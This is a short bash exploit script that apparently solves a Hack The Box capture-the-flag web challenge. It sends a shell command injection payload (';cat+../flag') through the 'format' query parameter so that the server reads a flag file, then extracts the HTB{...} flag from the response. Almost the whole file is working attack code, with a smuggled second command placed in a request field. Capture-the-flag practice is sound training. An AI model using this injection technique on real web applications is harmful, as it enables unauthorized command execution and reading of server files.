#!/usr/bin/env bash
if [ -z "$1" ] || [ "$#" -gt 1 ]; then
    echo "Usage $0 [url]"
    exit 1
fi

function ping() {
    local url="$1"
    if ! curl "$url" >/dev/null 2>&1; then
        echo "Error reaching: $url"
        exit 1
    fi
    return 0
}

function main() {
    local url="$1"
    local payload="';cat+../flag'"
    local flag=$(curl -s "$url/?format=$payload" | grep -o "HTB{[a-zA-Z0-9_+-]*}")
    
    if ! [[ "$url" =~ ^(https?)://([^/]+) ]]; then
        echo "Invalid url: $url"
        exit 1
    fi
    
    ping "$url"
    
    printf '[+] payload: %s/?format=%s\n' "$url" "$payload"
    printf '[+] Flag: %s' "$flag"
    return 0
}

main $1 && exit 0